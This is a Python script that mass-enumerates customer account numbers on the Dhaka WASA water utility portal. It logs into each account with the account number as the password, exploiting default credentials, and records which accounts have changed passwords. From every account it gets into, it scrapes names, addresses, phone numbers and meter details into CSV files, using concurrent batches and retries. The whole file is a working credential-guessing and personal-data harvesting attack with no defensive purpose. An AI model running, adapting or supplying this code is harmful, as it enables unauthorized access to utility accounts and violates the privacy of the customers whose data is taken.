# -*- coding: utf-8 -*-
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.simplefilter(action='ignore', category=FutureWarning)
import requests,sys,os
from datetime import datetime
from itertools import *
import time,gc
import pandas as pd
import lxml.html as LH
from lxml import etree
import requests,aiohttp,asyncio

#DMA List
#101-119
#201-215
#301-320
#401-410
#501-510
#601-617
#801-811
#901-920
#1001-1010
AllDMAs = [str(rr).zfill(4) for rr in list(range(101,120))+list(range(201,216))+list(range(301,321))+list(range(401,411))+list(range(501,511))\
    +list(range(601,618))+list(range(801,812))+list(range(901,921))+list(range(1001,1011))]

#firstTwo = [str(ff).zfill(2) for ff in list(range(1,10))]
#secondTwo = [str(ss).zfill(2) for ss in list(range(0,30))]
#firstFour = [j+k for j in firstTwo for k in secondTwo]

accounts = AllDMAs[67:74] #firstFour[124:131] #[i for i in range(0,1000)] #[str(i).zfill(10) for i in range(1,9999999999)]  #[int(str(i)+'000000000') for i in range(1,11)]  #[str(i) for i in range(32000001,32047240)]

not_accounts = []
#accounts = [i for i in accounts if i not in not_accounts]
batch_size_for_async_request = 100
time_out_for_request_wait = 120   #less timeout cause data miss
process_missed_accounts_flag = True
extract_bill_history = False
ouputpath = os.path.join(os.path.dirname(sys.argv[0]),'DWASAConnectionDetails_{0}'.format(time.strftime("%Y%d%m")))#

while_looper_latch = 2
headerWriteFlag = True         
start_sd_index = 0
end_sd_index = len(accounts)
accountErrorFlag = []
switch_code_if_not_found = 20000
total_no_acc_to_change = []
switch_code_if_not_found_in_total = 500000
donelist = missedlist = noaclist= whataclist = blankaclist = credchangedaclist = []

def wait_for_internet_connection():
    while True:
        try:
            #https://license.fiberlink.com/internettest
            response__ = requests.get('https://license.fiberlink.com/internettest',timeout=5)
            if response__.ok:
                return
        except Exception:
            time.sleep(5)
            print("Waiting for internet to connect {}.".format(datetime.now()))
            pass


wait_for_internet_connection()
try:
    with open('missedDWASA.dat','r+') as f:
        missedlist = f.readlines()
        missedlist = list(filter(None,list(set(list(map(str.strip,missedlist))))))
        f.seek(0)
        for m in missedlist:
            f.write(m+'\n')
        f.truncate()         
except:
    pass


try:
    with open('noacDWASA.dat','r+') as f:
        noaclist = f.readlines()
        noaclist = list(filter(None,list(set(list(map(str.strip,noaclist))))))
        f.seek(0)
        for n in noaclist:
            f.write(n+'\n')
        f.truncate()             
except:
    pass

try:
    with open('credchangedacDWASA.dat','r+') as f:
        credchangedaclist = f.readlines()
        credchangedaclist = list(filter(None,list(set(list(map(str.strip,credchangedaclist))))))
        f.seek(0)
        for c in credchangedaclist:
            f.write(c+'\n')
        f.truncate()        
except:
    pass

try:
    with open('blankacDWASA.dat','r+') as f:
        blankaclist = f.readlines()
        blankaclist = list(filter(None,list(set(list(map(str.strip,blankaclist))))))
        f.seek(0)
        for b in blankaclist:
            f.write(b+'\n')
        f.truncate()
except:
    pass
try:
    with open('whatacDWASA.dat','r+') as f:
        whataclist = f.readlines()
        whataclist = list(filter(None,list(set(list(map(str.strip,whataclist))))))
        f.seek(0)
        for w in whataclist:
            f.write(w+'\n')
        f.truncate()        
except:
    pass

try:
    with open('doneDWASA.dat','r+') as f:
        donelist = f.readlines()
        donelist = list(filter(None,list(map(str.strip,donelist))))
        f.seek(0)
        for d in donelist:
            f.write(d+'\n')
        f.truncate()        
        #donelistSet = set(done_list)# for faster performance convert to set
    #TINSUnique = [tn__ for tn__ in uTINS if tn__ not in donelistSet]
    #TINS = TINSUnique

except:
    pass
#prevent duplicate header write
if len(donelist)>0:
    headerWriteFlag = False
    
def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]    
def dedeuper(seq):
    seen = set()
    seen_add = seen.add
    return [x for x in seq if not (x in seen or seen_add(x))]
async def blankfiller(contnt):
    if contnt is None:
        cntnt = ""
    else:
        cntnt = contnt
    return cntnt

def print_full(x):
    pd.set_option('display.max_rows', None)
    pd.set_option('display.max_columns', None)
    pd.set_option('display.width', 2000)
    pd.set_option('display.float_format', '{:20,.2f}'.format)
    pd.set_option('display.max_colwidth', None)
    print(x)
    pd.reset_option('display.max_rows')
    pd.reset_option('display.max_columns')
    pd.reset_option('display.width')
    pd.reset_option('display.float_format')
    pd.reset_option('display.max_colwidth')

def sorter_(e_):
    #return int(e_[-6:])
    return int(e_)

async def fetcher(root_,ac__,lginrsp,resp):
    #dt__ = ['What',ac__]
    try:
        AccntN = await blankfiller(root_.xpath("//*[contains(text(),'Account No :')]")[0].text.split(':')[-1].strip()) #root.xpath("//tr[@class='tr_title_top']//td")[1].text.strip()
        WaterStatus =  await blankfiller(root_.xpath("//*[contains(text(),'Water Status:')]")[0].text.split(':')[-1].strip())
    except:
        AccntN = ''
        WaterStatus = ''
        
    #if 'Welcome to the Customer Account Statement' in str(resp) and len(AccntN)>0:
    if 'Invalid account' not in str(resp) and 'Welcome to the Customer Account Statement' in str(resp) and 'Invalid account' not in str(lginrsp) and len(AccntN)>0 and len(WaterStatus)>0:
        CPNO = await blankfiller(root_.xpath("//*[contains(text(),'CP NO.:')]")[0].text.split(':')[-1].strip())
        Name =  await blankfiller(root_.xpath("//*[contains(text(),'Name:')]")[0].text.split(':')[-1].strip())
        WaterStatus =  await blankfiller(root_.xpath("//*[contains(text(),'Water Status:')]")[0].text.split(':')[-1].strip())
        Category =  await blankfiller(root_.xpath("//*[contains(text(),'Categoty:')]")[0].text.split(':')[-1].strip())
        Address =  await blankfiller(root_.xpath("//*[contains(text(),'Address:')]")[0].text.split(':')[-1].strip())
        SewerStatus =  await blankfiller(root_.xpath("//*[contains(text(),'Sewer Status:')]")[0].text.split(':')[-1].strip())
        CellNo =  await blankfiller(root_.xpath("//*[contains(text(),'Cell No:')]")[0].text.split(':')[-1].strip())
        AvgConsumption = await  blankfiller(root_.xpath("//*[contains(text(),'Avg. Consumption:')]")[0].text.split(':')[-1].strip())
        AnnualValuation =  await blankfiller(root_.xpath("//*[contains(text(),'Annual Valuation:')]")[0].text.split(':')[-1].strip())
        MeterNo = await  blankfiller(root_.xpath("//*[contains(text(),'Meter No.:')]")[0].text.split(':')[-1].strip())
        MeterInsDate =  await blankfiller(root_.xpath("//*[contains(text(),'Meter Installation Date:')]")[0].text.split(':')[-1].strip())
        NoDemcertIssu =  await blankfiller(root_.xpath("//*[contains(text(),'No Demand Certificate Issued Upto:')]")[0].text.split(':')[-1].strip())
        IssDate =  await blankfiller(root_.xpath("//*[contains(text(),'Issue Date:')]")[0].text.split(':')[-1].strip())
        RefNo =  await blankfiller(root_.xpath("//*[contains(text(),'Ref No.:')]")[0].text.split(':')[-1].strip())
        Tel =  await blankfiller(root_.xpath("//*[contains(text(),'Tel:')]")[0].text.split(':')[-1].strip())

        if extract_bill_history:
            consumerTable = root_.xpath("//table")[7]
            #tbl = etree.tostring(consumerTable,method='html')
            dfName = pd.read_html(etree.tostring(consumerTable,method='html'),header=0,skiprows=None)
            dfName = dfName[-1].dropna(how='all')
            #dfName.drop(dfName.columns[[-1,-2,-3]], axis=1)
            #dfName.drop(dfName.columns[len(dfName.columns)-3], axis=1, inplace=True)
            dfName1 = 'dfName'+'_'+str(ac__)
            #dfName1 = dfName.iloc[:, :-3]
            dfName1 = dfName
            if dfName1.size<1:
                rws = {i:'-' for i in list(dfName1)}
                dfName1 = dfName1.append([rws], ignore_index=True)
            dfName1['AccountNo'] = AccntN
            dfName1['CPNO'] = CPNO
            dfName1['Name'] = Name
            dfName1['WaterStatus'] = WaterStatus
            dfName1['Category'] = Category
            dfName1['Address'] = Address
            dfName1['SewerStatus'] = SewerStatus
            dfName1['CellNo'] = CellNo
            dfName1['Tel'] = Tel
            dfName1['AvgConsumption'] = AvgConsumption
            dfName1['AnnualValuation'] = AnnualValuation
            dfName1['MeterNo'] = MeterNo
            dfName1['MeterInstallDate'] = MeterInsDate
            dfName1['NoDemandCertIssueDate'] = NoDemcertIssu
            dfName1['IssueDate'] = IssDate
            dfName1['RefNo'] = RefNo
            dfName1['Timestamp']= str(datetime.now())
            dt__ = [dfName1,ac__]
        else:
            dfName = pd.DataFrame([{'AccountNo':AccntN,'CPNO':CPNO,'Name':Name,'WaterStatus':WaterStatus,'Category':Category,'Address':Address,\
                                    'SewerStatus':SewerStatus,'CellNo':CellNo,'Tel':Tel,'AvgConsumption':AvgConsumption,\
                                    'AnnualValuation':AnnualValuation,'MeterNo':MeterNo,'MeterInstallDate':MeterInsDate,'NoDemandCertIssueDate':NoDemcertIssu\
                                    ,'IssueDate':IssDate,'RefNo':RefNo,'Timestamp':str(datetime.now())}])
            dfName1 = 'dfName'+'_'+str(ac__)
            dfName1 = dfName
            dt__ = [dfName1,ac__]
            
        print("Successfully got account {} with response of length {}.".format(ac__, len(resp)))
        
    elif 'Welcome to the Customer Account Statement' in str(resp) and len(AccntN)==0 and len(WaterStatus) == 0:
        dt__ = ['BlankAC',ac__]
        print("Blank account found for {}.".format(ac__))
        
    try:
        dt__
    except:
        pass
   
    return dt__

async def get(_accnt):
    dt = ['What',_accnt]    
    #connector = aiohttp.TCPConnector(limit=10,force_close=True)
    try:
        whilecounter=0
        while whilecounter <= while_looper_latch:
            async with aiohttp.ClientSession() as session:
                LOGIN_URL  = 'http://app.dwasa.org.bd/index.php?'#type_name=member&page_name=acc_index&panel_index=1'    
                params = {
                    'type_name': 'member',
                    'page_name': 'acc_index',
                    'panel_index': '1'
                }
                
                payload = {
                    'userId': _accnt,
                    'password': _accnt,
                    'bill_page_ref': '1',
                    'Submit':  'LogIn' 
                }
                
                payloadDate = {
                    'date1': '01-07-2000',
                    'date2': '31-12-2021',
                    'btn': 'Search'
                }
                
                async with session.post(url=LOGIN_URL,params=params,data=payload,timeout=time_out_for_request_wait) as rst:
                    lginrsp1 = await rst.read()
                    if 'Invalid account'  in str(lginrsp1):
                        #dt= await fetcher(None,_accnt,lginrsp1)
                        dt = ['NoAC',_accnt]
                        print("No account found for {}.".format(_accnt))                        
                        del rst,lginrsp1
                        break
                    elif 'Password is not correct' in str(lginrsp1) and 'User ID &' not in str(lginrsp1):
                        #dt= await fetcher(None,_accnt,lginrsp1)
                        dt = ['CredChanged',_accnt]
                        print("Password changed found for account {}.".format(_accnt))                        
                        del rst,lginrsp1
                        break
                    else:
                        #send request again since did not login
                        async with session.post(url=LOGIN_URL,params=params,data=payload,timeout=time_out_for_request_wait) as rst:
                            lginrsp1 = await rst.read()
                            root1 = LH.fromstring(lginrsp1)
                            if 'Welcome to the Customer Account Statement'  in str(lginrsp1):
                                dt= await fetcher(root1,_accnt,None,lginrsp1)
                            
                                if extract_bill_history:
                                    async with session.post(url=LOGIN_URL,params=params,data=payloadDate,timeout=time_out_for_request_wait) as respons:
                                        resp1 = await respons.read()
                                        #extract_bill_history
                                        root1 = LH.fromstring(resp1)
                                    if 'Welcome to the Customer Account Statement'  in str(resp1):
                                        dt= await fetcher(root1,_accnt,None,resp1)
                                        break
                                else:
                                    break
                            
                whilecounter+=1
                print('Ran while loop to collect {0} times for {1}.'.format(whilecounter,_accnt))
                #del rst,respons,lginrsp1,root1,resp1
            del session

                        
    except Exception as e:
        print("Unable to get account {} due to {}.".format(_accnt, e.__class__))
        dt = ['Error',_accnt]
        print("Error while trying to collect for {}.".format(_accnt))
    return dt

async def main(_account_s):
    global accountErrorFlag
    global total_no_acc_to_change
    global headerWriteFlag
    #wait for internet connection
    wait_for_internet_connection()
    
    dones,pendings = await asyncio.wait([get(ac_c) for ac_c in _account_s])
    #print("Finalized all. ret is a list of len {} outputs.".format(len(dones)))
    data_results = [i.result() for i in dones]
    
    dfs = [i[0] for i in data_results if isinstance(i[0],pd.DataFrame)]
    if len(dfs)>0:    
        dfNameConcated = pd.concat(dfs)
        name_suffix_done = '_'+str(accounts[start_sd_index])[:2]+'-'+ str(accounts[-1])[:2]+'_'   #str('__'+orted(_account_s)[0]+'_to_'+sorted(_account_s)[-1])
        dfNameConcated.to_csv(ouputpath+name_suffix_done+'.csv',encoding='utf-8-sig',index=False,mode='a',header=headerWriteFlag)
        done_accounts = sorted(dfNameConcated['AccountNo'].unique())
        #write done accounts
        df_done = pd.DataFrame(done_accounts, columns=["done_accounts"])
        done_file_name = 'doneDWASA.dat'
        df_done.to_csv(done_file_name, mode = 'a', index=False,header=False)
        headerWriteFlag = False
    
    no_ac_data = [i[0] for i in [i for i in data_results if not isinstance(i[0],pd.DataFrame)] if i[0] == 'NoAC']
    if len(no_ac_data) == batch_size_for_async_request:
        accountErrorFlag = accountErrorFlag+no_ac_data
    elif len(dfs)>0:
        accountErrorFlag=[]
    if len(no_ac_data)>0:
        total_no_acc_to_change = total_no_acc_to_change+no_ac_data
        
    
        
    missed_accounts = [i[1] for i in [i for i in data_results if not isinstance(i[0],pd.DataFrame)] if i[0] == 'Error']
    #write missed accounts
    df_missed = pd.DataFrame(missed_accounts, columns=["missed_accounts"])
    missed_csv_name = 'missedDWASA.dat'
    #if process_missed_accounts_flag:
        #modeM = 'w'
    #else:
        #modeM = 'a'
    if len(missed_accounts)>0:
        df_missed.to_csv(missed_csv_name,mode = 'a', index=False,header=False)
    
    #process no accounts
    noac_accounts = [i[1] for i in [i for i in data_results if not isinstance(i[0],pd.DataFrame)] if i[0] == 'NoAC']
    if len(noac_accounts)>0:
        #write no accounts
        df_noac = pd.DataFrame(noac_accounts, columns=["no_accounts"])
        noac_csv_name = 'noacDWASA.dat'
        df_noac.to_csv(noac_csv_name,mode = 'a', index=False,header=False)
    
    #process What
    whatac_accounts = [i[1] for i in [i for i in data_results if not isinstance(i[0],pd.DataFrame)] if i[0] == 'What']
    if len(whatac_accounts)>0:
        #write what accounts
        df_whatac = pd.DataFrame(whatac_accounts, columns=["what_accounts"])
        whatac_csv_name = 'whatacDWASA.dat'
        df_whatac.to_csv(whatac_csv_name,mode = 'a', index=False,header=False)

    #process blank account
    blankac_accounts = [i[1] for i in [i for i in data_results if not isinstance(i[0],pd.DataFrame)] if i[0] == 'BlankAC']
    if len(blankac_accounts)>0:
        #write blank accounts
        df_blankac = pd.DataFrame(blankac_accounts, columns=["blank_accounts"])
        blankac_csv_name = 'blankacDWASA.dat'
        df_blankac.to_csv(blankac_csv_name,mode = 'a', index=False,header=False)
    
    #process credchagned account
    credchangedac_accounts = [i[1] for i in [i for i in data_results if not isinstance(i[0],pd.DataFrame)] if i[0] == 'CredChanged']
    if len(credchangedac_accounts)>0:
        #write blank accounts
        df_credchangedac = pd.DataFrame(credchangedac_accounts, columns=["credchanged_accounts"])
        credchangedac_csv_name = 'credchangedacDWASA.dat'
        df_credchangedac.to_csv(credchangedac_csv_name,mode = 'a', index=False,header=False)        
    
    print("Acounts collection perfomance=========================noac:{0}/missed:{1}/done:{2}/what:{3}/blank:{4}/credchanged:{5} = {6}===========================\
    ".format(len(noac_accounts),len(missed_accounts), len(dfs),len(whatac_accounts),len(blankac_accounts),len(credchangedac_accounts),len(_account_s)))    
    
    
def scraper():
    total_accounts_scraped = 0        
    accounts_ = accounts[start_sd_index:end_sd_index]
    for account in accounts_:
        #firstcheckac = account+1
        accountErrorFlag = total_no_acc_to_change = []
        internal_acc = [account+str(i).zfill(6) for i in list(range(1,999999))]
        D_1 = set(donelist)
        D_2 = set(noaclist)
        #D_3 = set(blankaclist)
        #D_ = set.union(D_1,D_2,D_3)
        D_ = set.union(D_1,D_2)
        
        unqDoneList = [a for a in internal_acc if a not in D_]
        if process_missed_accounts_flag:
            unqDoneList = list(set(missedlist+unqDoneList+blankaclist+whataclist))
            #process what accounts
            #unqDoneList = list(set(unqDoneList+whataclist+blankaclist))
            
        unqDoneList.sort(key=sorter_)
        #unqDoneList = sorted(unqDoneList)[:]
        account_bathces = [chunk for chunk in chunks(unqDoneList,batch_size_for_async_request)] #[['0108080951']] # [['0501010139']] [['0504000019']]
        del D_1,D_2,D_,unqDoneList,internal_acc
        tot_time = time.time()
        for batch in account_bathces:
            start_time = time.time()
            if not len(accountErrorFlag) > switch_code_if_not_found or len(total_no_acc_to_change) < switch_code_if_not_found_in_total:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(main(batch))
                #asyncio.get_event_loop().run_until_complete(main(batch))
                total_accounts_scraped += len(batch)
                end_time=time.time()
                print("Took {0}/{1} seconds to pull {2}/{3} accounts.....................................................\
                ".format(end_time - start_time,end_time-tot_time, len(batch),total_accounts_scraped))
            else:
                break
            gc.collect()